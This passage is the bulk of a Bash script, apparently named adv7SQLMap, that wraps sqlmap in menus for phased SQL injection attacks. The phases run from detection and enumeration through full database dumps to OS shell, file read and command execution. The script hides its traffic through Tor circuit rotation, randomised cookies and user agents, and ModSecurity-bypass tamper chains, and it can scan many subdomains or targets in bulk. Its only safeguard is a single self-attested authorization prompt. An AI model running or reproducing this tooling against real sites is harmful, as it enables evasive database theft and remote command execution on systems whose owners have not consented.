    box_row "${G}[p]${RS} Phase 0 — WAF Detection"
    box_row "${G}[2]${RS} Phase 1 — Detection"
    box_row "${G}[3]${RS} Phase 2 — Enumeration"
    box_row "${G}[4]${RS} Phase 3 — Targeted Dump"
    box_row "${G}[5]${RS} Phase 4 — Escalation  ${esc_tag}"
    box_row "${G}[6]${RS} Run All Phases (0-3)"
    box_row "${G}[7]${RS} View Results"
    box_row "${G}[9]${RS} Rotate Tor Circuit (manual)"
    box_row "${G}[B]${RS} BurpSuite / Multi-Target Import"
    box_row "${R}[0]${RS} Exit"
    box_bot
    tput cnorm
    echo -ne "${BG}>${RS} "
}

# ── Configure sub-menu ───────────────────────────────────────────────────────
cfg_row() {
    local key="$1" val="$2"
    local display="${val:-${D}(empty)${RS}}"
    box_row "${C}${key}${RS}  ${display}"
}

draw_configure_menu() {
    clear
    tput civis
    box_top
    box_row "${B}Configure Target & Options${RS}"
    box_empty
    cfg_row "[1] Target URL   :" "$TARGET"
    cfg_row "[2] Parameter    :" "$PARAM"
    cfg_row "[3] Cookie       :" "$(_trunc "$COOKIE" 32)"
    cfg_row "[4] Header       :" "$(_trunc "$HEADER" 32)"
    cfg_row "[5] Tamper       :" "$(_trunc "$TAMPER" 36)"
    cfg_row "[6] Proxy        :" "$PROXY"
    cfg_row "[7] POST Data    :" "$(_trunc "$POST_DATA" 30)"
    cfg_row "[8] Level  (1-5) :" "$LEVEL"
    cfg_row "[9] Risk   (1-3) :" "$RISK"
    cfg_row "[T] Threads      :" "$THREADS"

    local esc_lbl dry_lbl
    $ESCALATE && esc_lbl="${R}ON${RS}" || esc_lbl="${D}OFF${RS}"
    $DRY_RUN  && dry_lbl="${Y}ON${RS}" || dry_lbl="${D}OFF${RS}"
    box_row "${C}[E]${RS} Escalation (toggle) : ${esc_lbl}"
    box_row "${C}[D]${RS} Dry-Run    (toggle) : ${dry_lbl}"
    box_row "${C}[R]${RS} Reset All"
    box_empty

    local tor_lbl hex_lbl waf_lbl
    $USE_TOR  && tor_lbl="${G}ON${RS}"  || tor_lbl="${D}OFF${RS}"
    $HEX      && hex_lbl="${G}ON${RS}"  || hex_lbl="${D}OFF${RS}"
    $SKIP_WAF && waf_lbl="${G}ON${RS}"  || waf_lbl="${D}OFF${RS}"
    box_row "${C}[O]${RS} Tor          (toggle) : ${tor_lbl}"
    box_row "${C}[U]${RS} User-Agent (set/clear): $(_trunc "${UA:-auto}" 28)"
    box_row "${C}[K]${RS} Cookie (regen/clear)  : $([[ -n "$COOKIE_STRING" ]] && echo set || echo none)"
    box_row "${C}[X]${RS} Hex encode   (toggle) : ${hex_lbl}"
    box_row "${C}[W]${RS} Delay (seconds)       : ${DELAY}"
    box_row "${C}[S]${RS} Skip-WAF     (toggle) : ${waf_lbl}"
    local canary_lbl2
    if $USE_CANARY && $USE_TOR; then
        canary_lbl2="${G}ON${RS} ${D}(retries=${TOR_MAX_RETRIES})${RS}"
    else
        canary_lbl2="${D}OFF${RS}"
    fi
    box_row "${C}[C]${RS} Canary/rotate (toggle): ${canary_lbl2}"
    box_row "${R}[0]${RS} Back"
    box_bot
    tput cnorm
    echo -ne "${BG}>${RS} "
}

menu_configure() {
    local cfg_choice _wait_in
    while true; do
        draw_configure_menu
        read -r cfg_choice
        case "${cfg_choice,,}" in
            1) echo -ne "${G}Target URL or scope .txt file${RS}: "; read -r TARGET
               if [[ -n "$TARGET" && ! "$TARGET" =~ ^https?:// && -f "$TARGET" ]]; then
                   TARGETS_FILE="$TARGET"; BURP_FILE=""; SUBDOMAINS_FILE=""; URL_TPL=""
                   TARGET=""; AUTH_OK=false; OUT=""; LOG="/dev/null"
                   echo -e "${G}  [*] Scope file set. Use [6] Run All to launch multi-target scan.${RS}"
                   sleep 1
               else
                   AUTH_OK=false; OUT=""; LOG="/dev/null"
               fi ;;
            2) echo -ne "${G}Parameter${RS}: ";  read -r PARAM ;;
            3) echo -ne "${G}Cookie${RS}: ";     read -r COOKIE ;;
            4) echo -ne "${G}Header${RS}: ";     read -r HEADER ;;
            5) echo -ne "${G}Tamper scripts (comma-sep)${RS}: "; read -r TAMPER ;;
            6) echo -ne "${G}Proxy URL${RS}: ";  read -r PROXY ;;
            7) echo -ne "${G}POST data${RS}: ";  read -r POST_DATA ;;
            8) echo -ne "${G}Level [1-5]${RS}: "; read -r LEVEL
               [[ "$LEVEL" =~ ^[1-5]$ ]] || { echo -e "${R}[!] Level must be 1-5.${RS}"; LEVEL=1; sleep 0.8; } ;;
            9) echo -ne "${G}Risk  [1-3]${RS}: "; read -r RISK
               [[ "$RISK" =~ ^[1-3]$ ]] || { echo -e "${R}[!] Risk must be 1-3.${RS}"; RISK=1; sleep 0.8; } ;;
            t) echo -ne "${G}Threads${RS}: "; read -r THREADS
               [[ "$THREADS" =~ ^[1-9][0-9]*$ ]] || { echo -e "${R}[!] Threads must be a positive integer.${RS}"; THREADS=3; sleep 0.8; } ;;
            e) $ESCALATE && ESCALATE=false || ESCALATE=true ;;
            d) $DRY_RUN  && DRY_RUN=false  || DRY_RUN=true ;;
            r)
                TARGET="" PARAM="" COOKIE="" HEADER="" PROXY="" POST_DATA=""
                LEVEL=1 RISK=1 THREADS=3 ESCALATE=false DRY_RUN=false AUTH_OK=false OUT="" LOG="/dev/null"
                TEMPLATE="" EXTRA_FLAGS=() COOKIE_STRING=""
                TAMPER="space2comment,randomcase,charencode"
                USE_TOR=true HEX=true SKIP_WAF=false DELAY=1
                USE_CANARY=true TOR_MAX_RETRIES=3
                echo -e "${Y}[*] All options reset (evasion defaults restored).${RS}"; sleep 1 ;;
            o) $USE_TOR && USE_TOR=false || USE_TOR=true ;;
            u)
                echo -ne "${G}User-Agent (blank to clear/auto-rotate)${RS}: "
                read -r UA ;;
            k)
                COOKIE_STRING=$(gen_random_cookies)
                echo -e "${G}[*] Regenerated: ${COOKIE_STRING}${RS}"; sleep 1 ;;
            x) $HEX && HEX=false || HEX=true ;;
            w)
                echo -ne "${G}Delay seconds${RS}: "; read -r _wait_in
                [[ "$_wait_in" =~ ^[0-9]+$ ]] && DELAY="$_wait_in" \
                    || { echo -e "${R}[!] Not a number.${RS}"; sleep 0.8; } ;;
            s) $SKIP_WAF && SKIP_WAF=false || SKIP_WAF=true ;;
            c) $USE_CANARY && USE_CANARY=false || USE_CANARY=true ;;
            0) break ;;
            *) echo -e "${R}[!] Invalid choice.${RS}"; sleep 0.5 ;;
        esac
    done
}

# ── Build BASE_ARGS from current state ───────────────────────────────────────
build_base_args() {
    BASE_ARGS=(
        -u "$TARGET"
        --batch
        --threads="$THREADS"
        --level="$LEVEL"
        --risk="$RISK"
        --timeout=30
        --retries=2
        --random-agent
    )
    [[ -n "$TAMPER"   ]] && BASE_ARGS+=(--tamper="$TAMPER")
    (( DELAY > 0 ))      && BASE_ARGS+=(--delay="$DELAY")
    $HEX                 && BASE_ARGS+=(--hex)
    $SKIP_WAF            && BASE_ARGS+=(--skip-waf)
    [[ -n "$PARAM"    ]] && BASE_ARGS+=(-p "$PARAM")
    # explicit -c cookie overrides auto-generated COOKIE_STRING
    if [[ -n "$COOKIE" ]]; then
        BASE_ARGS+=(--cookie="$COOKIE")
    elif [[ -n "$COOKIE_STRING" ]]; then
        BASE_ARGS+=(--cookie="$COOKIE_STRING")
    fi
    [[ -n "$HEADER"   ]] && BASE_ARGS+=(--header="$HEADER")
    [[ -n "$UA"       ]] && BASE_ARGS+=(--user-agent="$UA")
    [[ -n "$PROXY"    ]] && BASE_ARGS+=(--proxy="$PROXY")
    [[ -n "$POST_DATA" ]] && BASE_ARGS+=(--data="$POST_DATA" --method=POST)
    [[ ${#EXTRA_FLAGS[@]} -gt 0 ]] && BASE_ARGS+=("${EXTRA_FLAGS[@]}")
}

# ── sqlmap runner ────────────────────────────────────────────────────────────
run_sqlmap() {
    local phase_name="$1"; shift
    local extra_args=("$@")
    build_base_args
    local -a cmd=(sqlmap "${BASE_ARGS[@]}" "${extra_args[@]}")
    $USE_TOR && cmd=(torsocks "${cmd[@]}")
    local _cmd_display="${cmd[*]}"
    [[ -n "$COOKIE_STRING" ]] && _cmd_display="${_cmd_display//"$COOKIE_STRING"/***}"
    [[ -n "$COOKIE"        ]] && _cmd_display="${_cmd_display//"$COOKIE"/***}"
    [[ "$PROXY" == *"@"* ]] && _cmd_display="${_cmd_display//"$PROXY"/***}"
    echo -e "\n${G}[*] ${phase_name}${RS}"
    echo -e "${D}    CMD: ${_cmd_display}${RS}\n"
    echo "CMD: ${cmd[*]}" >> "$LOG"
    if $DRY_RUN; then
        echo -e "${Y}    [DRY-RUN] Skipping execution.${RS}"
        return 0
    fi
    # capture log offset before running so CRITICAL grep is scoped to this phase only
    local _log_line_start=0
    [[ -f "$LOG" ]] && _log_line_start=$(wc -l < "$LOG")

    "${cmd[@]}" 2>&1 | tee -a "$LOG"

    # detect Tor drops from this phase's output only; rotate if above threshold
    if $USE_CANARY && $USE_TOR && [[ "$LOG" != "/dev/null" ]]; then
        local _crits
        _crits=$(tail -n +"$(( _log_line_start + 1 ))" "$LOG" 2>/dev/null \
            | grep -c "CRITICAL.*unable to connect" || echo 0)
        if [[ "$_crits" -gt "$TOR_CRIT_THRESHOLD" ]]; then
            echo -e "\n${Y}[!] ${_crits} connection drops in phase — rotating Tor circuit${RS}"
            tor_rotate 1 || true
        fi
    fi
}

# ── Authorization (fires once) ────────────────────────────────────────────────
do_auth() {
    local _auth domain
    if $AUTH_OK; then return 0; fi
    echo ""
    echo -e "${R}  [!] AUTHORIZATION REQUIRED${RS}"
    echo -e "      Target : ${TARGET}"
    echo -e "      You must have explicit written permission to test this target."
    echo ""
    read -rp "  Confirm authorized [yes/N] > " _auth
    if [[ "${_auth,,}" != "yes" ]]; then
        echo -e "${R}[*] Aborted — authorization not confirmed.${RS}"
        return 1
    fi
    AUTH_OK=true

    domain="${TARGET#*//}"
    domain="${domain%%/*}"
    domain="${domain//[^a-zA-Z0-9._-]/_}"
    OUT="./sqli_${domain}_$(date +%Y%m%d_%H%M)"
    ( umask 077; mkdir -p "$OUT" )
    LOG="${OUT}/adv7SQLMap_$(date +%Y%m%d_%H%M%S).log"
    touch "$LOG" && chmod 600 "$LOG"
    echo -e "${G}[*] Output dir: ${OUT}${RS}"
    echo -e "${G}[*] Log:        ${LOG}${RS}"
    sleep 1
}

# ── Phase runners ─────────────────────────────────────────────────────────────
run_phase0() {
    tor_check_and_rotate || true
    # WAF fingerprint is automatic in sqlmap >=1.9 — no flag needed
    run_sqlmap "Phase 0 — WAF Probe (auto-detect)" \
        --level=1 --risk=1 \
        --output-dir="${OUT}/phase0_waf"
    echo -e "\n${G}[*] Phase 0 complete — check ${OUT}/phase0_waf${RS}"
}

run_phase1() {
    tor_check_and_rotate || true
    run_sqlmap "Phase 1 — Detection" \
        --dbs \
        --output-dir="${OUT}/phase1_detection"
    echo -e "\n${G}[*] Phase 1 complete.${RS}"
}

run_phase2() {
    if ! $DRY_RUN; then
        if [[ ! -d "${OUT}/phase1_detection" ]]; then
            echo -e "${Y}[!] Run Phase 1 first (no phase1_detection dir found).${RS}"
            return 1
        fi
        # skip Phase 2 if Phase 1 log has no confirmed injection points
        if ! grep -rq "identified the following injection" "${OUT}/phase1_detection" 2>/dev/null; then
            echo -e "${Y}[!] Phase 1 found no confirmed injection — Phase 2 skipped.${RS}"
            return 0
        fi
    fi
    tor_check_and_rotate || true
    run_sqlmap "Phase 2 — Enumeration" \
        --dbs --tables --current-user --current-db --hostname \
        --output-dir="${OUT}/phase2_enum"
    echo -e "\n${G}[*] Phase 2 complete.${RS}"
}

run_phase3() {
    tput cnorm
    local _db _tbl
    local -a _dump_args
    echo -ne "\n${G}  Target database to dump (blank to skip)${RS}: "
    read -r _db
    if [[ -z "$_db" ]]; then
        echo -e "${D}  Phase 3 skipped.${RS}"; return 0
    fi
    tor_check_and_rotate || true
    echo -ne "${G}  Target table (blank for all)${RS}: "
    read -r _tbl
    _dump_args=(--output-dir="${OUT}/phase3_dump" -D "$_db")
    [[ -n "$_tbl" ]] && _dump_args+=(-T "$_tbl" --dump) || _dump_args+=(--dump-all)
    run_sqlmap "Phase 3 — Dump (${_db}${_tbl:+.${_tbl}})" "${_dump_args[@]}"
    echo -e "\n${G}[*] Phase 3 complete.${RS}"
}

run_phase4() {
    tput cnorm
    tor_check_and_rotate || true
    local _action _fread _oscmd
    if ! $ESCALATE; then
        echo -e "\n${D}  Phase 4 is LOCKED. Enable Escalation in Configure menu.${RS}"
        return 0
    fi
    echo -e "\n${R}  [!] Escalation active. Authorized targets only.${RS}"
    echo -ne "  Action ${C}[os-shell / file-read / os-cmd]${RS}: "
    read -r _action
    case "${_action,,}" in
        os-shell)
            run_sqlmap "Phase 4 — OS Shell" \
                --os-shell --output-dir="${OUT}/phase4_escalation" ;;
        file-read)
            echo -ne "  File path to read: "; read -r _fread
            run_sqlmap "Phase 4 — File Read (${_fread})" \
                --file-read="$_fread" --output-dir="${OUT}/phase4_escalation" ;;
        os-cmd)
            echo -ne "  OS command: "; read -r _oscmd
            run_sqlmap "Phase 4 — OS Cmd (${_oscmd})" \
                --os-cmd="$_oscmd" --output-dir="${OUT}/phase4_escalation" ;;
        *) echo -e "${R}[!] Unknown action.${RS}" ;;
    esac
    echo -e "\n${G}[*] Phase 4 complete.${RS}"
}

run_all() {
    run_phase0 || true
    run_phase1 || true
    run_phase2 || true
    run_phase3 || true
}

# ── Pre-phase guard ──────────────────────────────────────────────────────────
guard_ready() {
    tput cnorm
    if [[ -z "$TARGET" ]]; then
        echo -e "\n${R}[!] No target set. Go to Configure first.${RS}"
        sleep 1.5; return 1
    fi
    do_auth || { sleep 1.5; return 1; }
    return 0
}

# ── Results viewer ────────────────────────────────────────────────────────────
menu_results() {
    local f
    clear
    box_top
    box_row "${B}Results${RS}"
    box_bot
    if [[ -z "$OUT" || ! -d "$OUT" ]]; then
        echo -e "${Y}[!] No scan output directory yet. Run a phase first.${RS}"
    else
        echo -e "${G}[+] Scan dir: ${OUT}${RS}"
        echo ""
        find "$OUT" -type f | sort | while read -r f; do
            printf "  %-50s  %s\n" "$f" "$(du -h "$f" | cut -f1)"
        done
        echo ""
        if [[ -n "$LOG" && -f "$LOG" ]]; then
            echo -e "${C}── Last 40 log lines ─────────────────────────────${RS}"
            tail -40 "$LOG" | sed 's/\x1b\[[0-9;]*m//g'
        fi
    fi
    echo ""
    echo -ne "${D}Press Enter to return...${RS}"; read -r _
}

# ── Templates ────────────────────────────────────────────────────────────────
load_template() {
    local _tpl_px
    case "$1" in
        1) TEMPLATE="Stealth"
           LEVEL=1; RISK=1; THREADS=1
           TAMPER="space2comment,randomcase"
           DELAY=2; EXTRA_FLAGS=() ;;
        2) TEMPLATE="Low"
           LEVEL=2; RISK=1; THREADS=3
           TAMPER="space2comment"
           EXTRA_FLAGS=() ;;
        3) TEMPLATE="High"
           LEVEL=4; RISK=2; THREADS=10
           TAMPER="between,space2comment,charencode"
           EXTRA_FLAGS=() ;;
        4) TEMPLATE="Aggressive"
           LEVEL=5; RISK=3; THREADS=20
           TAMPER="between,equaltolike,space2comment,randomcase,charencode"
           EXTRA_FLAGS=(--forms --crawl=2) ;;
        5) TEMPLATE="ADV7Scan"
           LEVEL=5; RISK=3; THREADS=20
           TAMPER="between,equaltolike,greatest,ifnull2ifisnull,space2comment,randomcase,charencode"
           echo -ne "  ${C}Proxy for ADV7Scan (blank to skip)${RS}: "
           read -r _tpl_px
           [[ -n "$_tpl_px" ]] && PROXY="$_tpl_px"
           EXTRA_FLAGS=(--forms --crawl=3) ;;
        6) TEMPLATE="WAFBypass"
           LEVEL=3; RISK=2; THREADS=2
           TAMPER="between,equaltolike,greatest,ifnull2ifisnull,space2comment,randomcase,charencode,modsecurityversioned,modsecurityzeroversioned"
           DELAY=2; HEX=true; SKIP_WAF=true; USE_TOR=true; USE_CANARY=true
           EXTRA_FLAGS=(--crawl=2) ;;
        c|C) TEMPLATE=""; EXTRA_FLAGS=()
             echo -e "${D}  Template cleared — custom mode.${RS}"; sleep 0.8; return 0 ;;
        *) echo -e "${R}[!] Invalid template.${RS}"; sleep 0.8; return 1 ;;
    esac
    echo -e "${G}  [*] Template '${TEMPLATE}' loaded.${RS}"; sleep 0.8
}

draw_template_menu() {
    clear
    tput civis
    box_top
    box_row "${B}Load Scan Template${RS}"
    box_empty
    box_row "${G}[1]${RS} Stealth     — lvl=1 risk=1 t=1   ${D}minimal footprint${RS}"
    box_row "${G}[2]${RS} Low         — lvl=2 risk=1 t=3   ${D}careful, few FPs${RS}"
    box_row "${G}[3]${RS} High        — lvl=4 risk=2 t=10  ${D}deep detection${RS}"
    box_row "${G}[4]${RS} Aggressive  — lvl=5 risk=3 t=20  ${D}full vectors + forms${RS}"
    box_row "${Y}[5]${RS} ADV7Scan    — lvl=5 risk=3 t=20  ${Y}+ UA rotate + crawl${RS}"
    box_row "${Y}[6]${RS} WAFBypass   — lvl=3 risk=2 t=2   ${Y}+ modsec tamper + Tor${RS}"
    box_empty
    box_row "${C}[C]${RS} Clear template (return to custom)"
    box_row "${R}[0]${RS} Back"
    box_bot
    tput cnorm
    echo -ne "${BG}>${RS} "
}

menu_templates() {
    local tpl_choice
    while true; do
        draw_template_menu
        read -r tpl_choice
        case "${tpl_choice,,}" in
            1|2|3|4|5|6) load_template "$tpl_choice"; break ;;
            c) load_template c; break ;;
            0) break ;;
            *) echo -e "${R}[!] Invalid choice.${RS}"; sleep 0.5 ;;
        esac
    done
}

# ── Import sub-menu ───────────────────────────────────────────────────────────
draw_import_menu() {
    clear
    tput civis
    box_top
    box_row "${B}Import Mode${RS}"
    box_empty
    box_row "${G}[1]${RS} BurpSuite request  ${D}(raw .txt or Save-items XML)${RS}"
    box_row "${G}[2]${RS} Multi-target file  ${D}(one URL per line — sqlmap -m)${RS}"
    box_row "${G}[3]${RS} Subdomain scan     ${D}(subdomain list + URL template)${RS}"
    box_empty
    if [[ -n "$BURP_FILE" ]]; then
        local _tor_egress="${G}BurpSuite${RS}"
        $BURP_TOR_BYPASS || _tor_egress="${Y}torsocks${RS}"
        box_row "Active: ${Y}BurpSuite${RS} $(_trunc "$BURP_FILE" 24)  Tor:${_tor_egress}"
    fi
    if [[ -n "$TARGETS_FILE" ]];    then box_row "Active: ${Y}Multi-target${RS} $(_trunc "$TARGETS_FILE" 28)"; fi
    if [[ -n "$SUBDOMAINS_FILE" ]]; then box_row "Active: ${Y}Subdomain${RS} $(_trunc "$SUBDOMAINS_FILE" 30)"; fi
    box_empty
    box_row "${C}[X]${RS} Clear import mode"
    box_row "${R}[0]${RS} Back"
    box_bot
    tput cnorm
    echo -ne "${BG}>${RS} "
}

menu_import() {
    local _imp_choice
    while true; do
        draw_import_menu
        read -r _imp_choice
        case "${_imp_choice,,}" in
            1)
                TARGETS_FILE=""; SUBDOMAINS_FILE=""; URL_TPL=""
                echo -ne "${G}BurpSuite file path (raw .txt or XML)${RS}: "
                read -r BURP_FILE
                [[ -f "$BURP_FILE" ]] || { echo -e "${R}[!] File not found.${RS}"; sleep 0.8; }
                ;;
            2)
                BURP_FILE=""; SUBDOMAINS_FILE=""; URL_TPL=""
                echo -ne "${G}Targets file path (one URL per line)${RS}: "
                read -r TARGETS_FILE
                [[ -f "$TARGETS_FILE" ]] || { echo -e "${R}[!] File not found.${RS}"; sleep 0.8; }
                ;;
            3)
                BURP_FILE=""; TARGETS_FILE=""
                echo -ne "${G}Subdomains file path${RS}: "
                read -r SUBDOMAINS_FILE
                [[ -f "$SUBDOMAINS_FILE" ]] || { echo -e "${R}[!] File not found.${RS}"; sleep 0.8; continue; }
                echo -ne "${G}URL template (use {HOST} placeholder)${RS}: "
                read -r URL_TPL
                [[ -n "$URL_TPL" ]] || { echo -e "${R}[!] Template cannot be empty.${RS}"; sleep 0.8; }
                ;;
            x)
                BURP_FILE=""; TARGETS_FILE=""; SUBDOMAINS_FILE=""; URL_TPL=""
                echo -e "${Y}[*] Import mode cleared.${RS}"; sleep 0.6 ;;
            0) break ;;
            *) echo -e "${R}[!] Invalid choice.${RS}"; sleep 0.5 ;;
        esac
    done
}

# ── Main loop ────────────────────────────────────────────────────────────────
main_loop() {
    local choice
    while true; do
        draw_header
        draw_main_menu
        read -r choice
        case "${choice,,}" in
            1) menu_configure ;;
            8) menu_templates ;;
            p) guard_ready && { run_phase0 || true; echo -ne "${D}Press Enter...${RS}"; read -r _; } ;;
            2) guard_ready && { run_phase1 || true; echo -ne "${D}Press Enter...${RS}"; read -r _; } ;;
            3) guard_ready && { run_phase2 || true; echo -ne "${D}Press Enter...${RS}"; read -r _; } ;;
            4) guard_ready && { run_phase3 || true; echo -ne "${D}Press Enter...${RS}"; read -r _; } ;;
            5) guard_ready && { run_phase4 || true; echo -ne "${D}Press Enter...${RS}"; read -r _; } ;;
            6) if [[ -n "$TARGETS_FILE" ]]; then
                   do_auth_bulk "$TARGETS_FILE" && { run_multi_target || true; }
                   echo -ne "${D}Press Enter...${RS}"; read -r _
               elif [[ -n "$BURP_FILE" ]]; then
                   run_burp_mode || true
                   echo -ne "${D}Press Enter...${RS}"; read -r _
               elif [[ -n "$SUBDOMAINS_FILE" ]]; then
                   run_subdomain_scan || true
                   echo -ne "${D}Press Enter...${RS}"; read -r _
               else
                   guard_ready && { run_all; echo -ne "${D}Press Enter...${RS}"; read -r _; }
               fi ;;
            7) menu_results ;;
            9) if $USE_TOR; then
                   tor_rotate 1 || true
               else
                   echo -e "${Y}[!] Tor not enabled — nothing to rotate.${RS}"
               fi
               echo -ne "${D}Press Enter...${RS}"; read -r _ ;;
            b) menu_import ;;
            0) echo -e "${G}[*] Exiting adv7SQLMap. Stay authorized.${RS}"; exit 0 ;;
            *) echo -e "${R}[!] Invalid choice.${RS}"; sleep 0.5 ;;
        esac
    done
}

# ── Non-interactive startup (when -u supplied) ───────────────────────────────
run_noninteractive() {
    select_cookies
    [[ -z "$UA" ]] && rotate_ua
    # Import modes handle their own auth internally
    if [[ -n "$BURP_FILE" ]];       then run_burp_mode;      exit 0; fi
    if [[ -n "$SUBDOMAINS_FILE" ]]; then run_subdomain_scan; exit 0; fi
    if [[ -n "$TARGETS_FILE" ]];    then run_multi_target;   exit 0; fi
    # Standard single-URL mode
    guard_ready || exit 1
    if [[ -n "$ONLY_PHASE" ]]; then
        case "$ONLY_PHASE" in
            0) run_phase0 ;;
            1) run_phase1 ;;
            2) run_phase2 ;;
            3) run_phase3 ;;
            4) run_phase4 ;;
            *) echo -e "${R}[!] Invalid phase '$ONLY_PHASE'. Use 0-4.${RS}"; exit 1 ;;
        esac
    else
        run_all
    fi
    exit 0
}

# ── Entry point ──────────────────────────────────────────────────────────────
if [[ -n "$TARGET" || -n "$BURP_FILE" || -n "$TARGETS_FILE" || -n "$SUBDOMAINS_FILE" ]]; then
    run_noninteractive
else
    select_cookies
    [[ -z "$UA" ]] && rotate_ua
    main_loop
fi
